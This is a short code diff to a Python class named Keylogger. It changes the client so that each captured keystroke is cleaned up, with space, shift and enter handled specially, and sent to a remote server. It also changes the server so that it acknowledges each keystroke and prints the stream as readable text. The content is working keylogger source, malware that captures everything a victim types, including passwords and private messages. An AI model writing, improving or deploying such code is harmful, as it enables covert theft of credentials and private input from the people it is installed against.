@@ -7,7 +7,15 @@ class Keylogger:
 		self.server = server
 
 	def on_press(self, key):
-		self.server.send(str(key))
+		key = str(key).replace("'", "")
+
+		if key == 'Key.space':
+			key = ' '
+		if key == 'Key.shift_r':
+			key = ''
+		if key == "Key.enter":
+			key = '\n'
+		self.server.send(key)
 		status = self.server.recv()
 		if status == "STOP":
 			return False
@@ -33,7 +41,8 @@ class Keylogger:
 		try:
 			while True:
 				key = self.server.recv()
-				print(key)
+				self.server.send("received")
+				print(key, end='', flush=True)
 
 		except KeyboardInterrupt:
 			self.server.send("STOP")
